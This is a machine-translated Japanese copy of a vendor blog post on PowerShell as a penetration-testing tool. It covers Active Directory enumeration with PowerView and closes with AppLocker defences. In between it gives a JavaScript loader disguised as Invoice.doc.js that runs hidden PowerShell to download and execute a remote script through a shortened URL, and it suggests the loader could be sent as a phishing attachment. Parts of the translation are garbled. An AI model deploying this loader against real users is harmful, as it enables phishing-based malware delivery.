<!doctype html>
<html class="no-js" lang="ja">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-13"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-13');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>🕴🏽 🕺🏾 🤚🏼 ペンテストツールとしてのPowerShell：Varonisスクリプトと例 📽️ 🤾🏾 👰🏾</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="ハッカーはPowerShellを使用して、コンパイルされた悪意のあるコードを含む従来のバイナリではない「ファイルレスマルウェア」を起動することを好み、このため、ウイルス対策ソリューションで検出できない場合があります。
 
 もちろん、PowerShellは常に完全に通常の目的を持っていましたが、当初...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://geek-week.github.io/index.html"></a>
    <div class="page-header-text">Get best of the week</div>
  </header>
  <section class="page js-page"><h1>ペンテストツールとしてのPowerShell：Varonisスクリプトと例</h1><div class="post__body post__body_full">
      <div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/varonis/blog/471420/"><img src="https://habrastorage.org/webt/yz/rz/dv/yzrzdvxroj9qy1wcx-68ukv3leq.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ハッカーはPowerShellを使用して、コンパイルされた悪意のあるコードを含む従来のバイナリではない「ファイルレスマルウェア」を起動することを好み、このため、ウイルス対策ソリューションで検出できない場合があります。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
もちろん、PowerShellは常に完全に通常の目的を持っていましたが、当初は侵入テストとはまったく関係がありませんでした。 PowerShellの背景を知りたい方は、有名な</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">モナドマニフェストを</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">読んでください</font><font style="vertical-align: inherit;">。元の開発者の1人によって書かれたこのマニフェストは、Microsoftが最終的にPowerShellに変わった新しいスクリプト言語（つまり、スクリプト）を必要とした理由を説明しています。</font></font><br>
<a name="habracut"></a><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
長い17ページのドキュメントを表示する手間を省くために、PowerShellの作成者を促した主な動機付けの要因を明らかにします。これにより、システム管理者がコマンドラインから.Netオブジェクトにアクセスできるようになり、ワークフローをシステムレベルではなく自動化できるようになります。 C＃またはC ++のディーププログラミングレベル。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
PowerShell（以下、PS）の有効性の実際の証拠が必要な場合は、システム管理者に、ユーザーをActive Directoryに大規模に追加したり、迅速なセキュリティ設定を行ったりする方法を尋ねてください。ほとんどの場合、</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PowerShellソリューション</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">について学習し</font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;">ます</font></a><font style="vertical-align: inherit;">。つまり、PSは管理者の日常業務を減らし、生産性を向上させる優れた方法です。</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ペンテストにPowerShellを使用する理由 </font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
残念ながら、管理者向けの強力な自動化ツールとして非常に適しているものは、最終的にハッカーと侵入テスターの両方に役立ちます。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
IT管​​理者が、負荷の低いサーバーを実際に使用しているユーザーを特定するタスクを課されているとします。</font><font style="vertical-align: inherit;">PowerShellと高度な関数の</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PowerView</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ライブラリを使用する</font><font style="vertical-align: inherit;">と、システム管理者は</font><font style="vertical-align: inherit;">、サーバー自体にログオンし</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">なくても</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">、サーバーにログオンしているユーザーをすばやく表示でき</font><font style="vertical-align: inherit;">ます。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/vd/uj/4j/vduj4jfbtmqjuu1ewwqyxdqyiw4.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ただし、以前はフィッシング攻撃によってアクセス権を得ていた攻撃者も、次のように同じことを実行できます。 Active Directoryドメイン（以下、ADと呼びます）内でも同じ機能を使用できます。そして、それらのアクティビティは必ずしも検出されるとは限りません。アプリケーションの使用を監視する情報セキュリティアナリストは、</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PowerShellなので、無害である必要</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">があると結論付けることができます</font><font style="vertical-align: inherit;">。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
この例をさらに悪化させるために、ハッカーはGet-NetUserコマンドを使用して個々のユーザーに関するすべての詳細情報を取得することもできます。これにより、ADのすべてのユーザー属性がダンプされます。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/0k/xe/pf/0kxepfiywrasehvmphwsez5we9e.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
残念ながら、会社は、自宅や携帯電話、住所など、すべての従業員に対して公開するAD属性を無視することがあります。 PowerShell以前は、ADからこのすべてのデータを収集することははるかに困難でしたが、実際にはそうではありません！</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
攻撃者はこの情報を使用して何ができますか？彼らは</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ソーシャルエンジニアリング</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">手法</font><font style="vertical-align: inherit;">を</font><font style="vertical-align: inherit;">簡単に利用して、</font><font style="vertical-align: inherit;">これに対する攻撃を開発</font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
できます</font><font style="vertical-align: inherit;">。おそらく</font><font style="vertical-align: inherit;">、AD属性から派生した十分な量の個人的なコンテキストを電子メールで</font><font style="vertical-align: inherit;">送信</font><font style="vertical-align: inherit;">し、「パスワードのリセット」を要求する正当なサポートリクエストのように見せることができます。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ちなみに、AD属性にもACL制御を適用できるため、（！）このタイプの攻撃のリスクを軽減する方法があります。</font><font style="vertical-align: inherit;">そして、これはあなた自身の侵入テストの経験から得ることができるそれらの肯定的な結果の1つです。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/j3/pw/qy/j3pwqywf-zkdv4k043qheddjmne.png"><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PowerShell Pentesterチュートリアル </font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
攻撃者はPowerShellを使用して、内部のユーザーデータを慎重に収集し、攻撃に使用できます。しかし、IT担当者や情報セキュリティ担当者がPowerShellを十分に理解できず、独自のテストを開始して、ハッカーの考え方や動機を理解することができない理由はありません。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
PowerShellの最初の優れた点は、cmd.exeコマンドラインから実行したすべての古いスクリプトとbatファイルがPowerShellコンソールで引き続き機能することです。もう悪くないですよね？</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
次に重要な点は、Linuxのようなシェルとは異なり、PowerShellはすべてを</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">オブジェクト</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">として扱う</font><i><font style="vertical-align: inherit;">ということ</font></i><font style="vertical-align: inherit;">です。コマンドの出力（考えるだけ）もオブジェクトです。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
たとえば、</font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;">Get-ChildItem</font></a><font style="vertical-align: inherit;">コマンドを入力します。</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;"></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> （または別の方法でコマンドレットを実行するため、PSの世界でコマンドが呼び出されます）コンソールで、現在のディレクトリにあるファイルのリストが表示されます。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/wd/0g/vp/wd0gvpktcvbl8m3ol0qqzms9xx4.png"><br>
<br>
<h3><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PowerShellエンコーディング</font></font></font></h3><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
たとえば</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">、10 MB</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">を</font><i><font style="vertical-align: inherit;">超える</font></i><font style="vertical-align: inherit;">ファイルのみが表示されるPSスクリプトを作成するとします。</font><font style="vertical-align: inherit;">たとえば、どのファイルが多くのスペースを占有しているかをすばやく確認します。このタスクは、たとえばbashシェルの文字列出力で解決するのがはるかに困難になります。ただし、PowerShellでは、コマンドの出力自体が一連の</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">属性を</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">持つオブジェクト</font><i><font style="vertical-align: inherit;">です</font></i><font style="vertical-align: inherit;">。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
これを確認するには、GetChildItemの出力を</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Get-Member</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">に</font><font style="vertical-align: inherit;">渡すだけ</font><font style="vertical-align: inherit;">で、PSコマンドレットの属性が</font></font><br>
<br>
<img src="https://habrastorage.org/webt/ax/2s/4b/ax2s4bab8oyaibmvzitbhdsayiq.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
わかります</font><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">これで、対象となる2つの属性の識別子ができました。長さは「length」で、名前は「name」で、プログラムで参照できます。 5分-通常の飛行。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
オブジェクトが配列またはコレクションに含まれることがよくある状況に対処するために、</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ForEach</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> PSオペレーター</font><font style="vertical-align: inherit;">を</font><font style="vertical-align: inherit;">使用</font><font style="vertical-align: inherit;">して配列を反復処理します。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
さらに簡単にするために、エイリアスまたはエイリアス「％」は「ForEach」を意味し、「$ _」は現在のオブジェクトを表します。</font></font><br>
<br>
<h3><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PowerShellを使用したコマンドの実行</font></font></font></h3><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
新しい知識に基づいて、GetChildItemチームから2つの出力列を取得しましょう。</font><font style="vertical-align: inherit;">以下の例は、ForEachステートメントをフィードするGet-ChildItemを使用したパイプラインで、「length」属性と「name」属性の値のみを表示します。</font></font><br>
<br>
<pre><code class="plaintext hljs">get-childitem | % {write-host $_.length $_.name -separator<font></font>
"`t`t"}</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
コマンドの実行結果は次のとおりです。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/ic/fp/ag/icfpag8gul8ihfk--_tkqgdkzpk.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
豪華な例を完成させるために、スクリプトを調整して、たとえば10MBを超える大きなファイルのみを表示してみましょう。</font><font style="vertical-align: inherit;">これを行うには、</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Where-Objectコマンドレット</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">と</font><font style="vertical-align: inherit;">呼ばれる</font><font style="vertical-align: inherit;">便利なエイリアス "？"の</font><font style="vertical-align: inherit;">フィルターを使用します</font><font style="vertical-align: inherit;">。これには、通常の比較演算子（-gt、-eq、-ltなど）がすべて含まれています。パイプラインの途中に挿入し、スクリプトは次のようになります。</font></font><br>
<br>
<pre><code class="plaintext hljs"> get-ChildItem | ? {$_.length –gt 10000000 | % {write-host$_.length $_.name -separator "`t`t"}</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
演習として、上記のPS作成を自分の環境で実行してみてください。</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">チュートリアル：PowerShell侵入テストの例 </font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
PowerShellのこのわずかな経験で、私たちは非常に現実のペンテストの例に取り組む準備ができています。</font><font style="vertical-align: inherit;">ペンテストに入る最も速い方法の1つは、PowerShellを使用してペイロードを非表示にすることです。</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ここでそれを行う</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">方法について書き</font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;">ました</font></a><font style="vertical-align: inherit;">。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
アイデアは、.docというサフィックスが付いた標準のOfficeドキュメントでPowerShellコードを非表示にすることです。</font><font style="vertical-align: inherit;">実際、ファイルには拡張子.jsが付き、クリック</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">するとWindowsスクリプトの起動が</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">アクティブになり、</font><font style="vertical-align: inherit;">JavaScriptが実行されて、組み込みのPowerShellコードが起動します。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
少しわかりにくいですよね？</font><font style="vertical-align: inherit;">しかし、実際のハッカーは1つではなく、いくつかのレベルのネストと難読化を使用して、攻撃をできるだけ隠し、混乱させます。</font></font><br>
<br>
<h3><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ブートローダーとペイロードの準備 </font></font></font></h3><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
スクリプトは次のようになります。</font></font><br>
<br>
<pre><code class="plaintext hljs">a=new ActiveXObject('Wscript.Shell');a.Run("powershell -nop -noe -Command IEX (New-Object System.Net.WebClient).DownloadString('https://tinyurl.com/y5nupk4e')",1,true);</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
上記のコードをテキストファイルに貼り付け、名前を</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Invoice.doc.js</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">などに変更します</font><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">上記のJavaScriptは、組み込みのPowerShellコマンドレット</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">NetWebClient</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">および</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Invoke-Expression</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">を使用して実行されるローダーとして機能します</font><font style="vertical-align: inherit;">。これらは、それ自体が「％」のエイリアスです。</font><font style="vertical-align: inherit;">NetWebClientコマンドレット</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
の</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">DownloadString</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">メソッド</font><font style="vertical-align: inherit;">は、実際のペイロードをリモートで抽出します。これにより、最終的にすべてのダーティな作業が実行されます。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
独自のテストプログラムを指す独自のURLを挿入できます。</font><font style="vertical-align: inherit;">まあ、Invoke-Expressionコマンドレットは悪意のあるファイルのコードを受け取って実行します。</font></font><br>
<br>
<h3><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">これをチェックして！ </font></font></font></h3><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
私の場合、URLは単純なPS Write-Hostコマンドを含むGithubプロジェクトを指しており、すべての人類にとって無害ですが重要なメッセージを表示します。</font><font style="vertical-align: inherit;">実際の攻撃では、このようなシナリオのファイルがフィッシングメーリングリストに添付されている可能性があり、無防備な従業員を好奇心のわなに誘い込みます。</font><font style="vertical-align: inherit;">そして、ペイロードははるかに破壊的です。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/xu/xl/9w/xuxl9wgbtv0tmkyxmzuq1paqvyu.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
独自のインストールでこれを試すことができます。</font><font style="vertical-align: inherit;">そして、上記のすべてが正常に機能する場合、確実に実行する必要があるもう1つの緊急かつ重要なタスクがあります。</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">侵入テストの利点 </font></font></font></h2><br>
<img src="https://habrastorage.org/webt/up/uh/os/upuhostqscl7nnjnwnwlmhp2d1u.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
これが、ペネトレーションテストを行う理由につながります。</font><font style="vertical-align: inherit;">最初に頭に浮かぶ3つの真のメリットを次に示します。</font></font><br>
<br>
<ol>
<li>  PowerShell  ,  ,   «»      .     DownloadString  Invoke-Expression,          <i></i>    . </li>
<li>      .        ,      .  ,             ,    PowerShell. ,         .</li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PowerShellやその他のスクリプトベースのメソッド</font><font style="vertical-align: inherit;">を</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">制限</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">する方法を模索し始めるでしょう</font><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">結局、攻撃はスクリプトから始まるため、企業がスクリプトの実行を困難にした場合、リスクプロファイルを大幅に削減できます。</font></font></li>
</ol><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
最後の点について詳しく説明しましょう。</font><font style="vertical-align: inherit;">これはWindowsシステムソフトウェアの基本的な部分であるため、PowerShell（またはJavaScript）を完全に禁止することは望まないでしょう。</font><font style="vertical-align: inherit;">さいわい、マイクロソフトには、</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">AppLocker</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">を介してスクリプト（およびその他の実行可能ファイル）を選択的に無効にする方法があります。これは、</font><font style="vertical-align: inherit;">最新のグループポリシー（GPO）の古いソフトウェア制限ポリシーの改良版です。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
これは技術者には信じられないように思えるかもしれませんが、ほとんどの一般ユーザーは、日常の作業を行うためにPowerShellや他のスクリプト言語を必要としません。</font><font style="vertical-align: inherit;">もちろん、これは衝撃的です。</font><font style="vertical-align: inherit;">たとえば、AppLockerは、システム管理者が引き続きハードワークを行えるようにしながら、大衆に対するPowerShellアクセスを無効にするように構成できます。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
電子メールの添付ファイルに関連するものを含むスクリプトベースの攻撃は、管理者に依存して、従業員に過度に広いスクリプト権限を提供します。</font><font style="vertical-align: inherit;">そして、これはそうであってはなりません！</font></font></div>
      
    </div>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../ja471404/index.html">他の国でエンジニアとして働いて、もっと稼ぐことは可能ですか？</a></li>
<li><a href="../ja471408/index.html">バズフェーズインバーターの代替：伝送ライン（TQWT、ALT）</a></li>
<li><a href="../ja471412/index.html">デスクトップ上の大量のジャンクに関する投稿</a></li>
<li><a href="../ja471414/index.html">最先端のヘルプデスクシステム。要件を取得してクラウドサービスを開発するにはどうすればよいですか？</a></li>
<li><a href="../ja471418/index.html">VRマーケットはゲームデザイナーに何を教えることができますか？</a></li>
<li><a href="../ja471426/index.html">集団農場「共産主義の道」または農業の開催地をITがどのように大幅に支援できるか</a></li>
<li><a href="../ja471430/index.html">内部評論家と交渉する方法</a></li>
<li><a href="../ja471432/index.html">悪質なAftershokzヘッドフォン、またはMarvelがどのように刺激を受け、何が刺激を受けるか</a></li>
<li><a href="../ja471434/index.html">LinuxでのLync会議への自動ログイン</a></li>
<li><a href="../ja471436/index.html">Android向けの新しい3CXアプリ-質問と推奨事項への回答</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter63335242 = new Ya.Metrika({
                  id:63335242,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/63335242" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-13', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Geek Week | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2020</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=i62cJ2037o_BACd40gCrIso3niu0Sjx2sDFYJkeYdRk&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>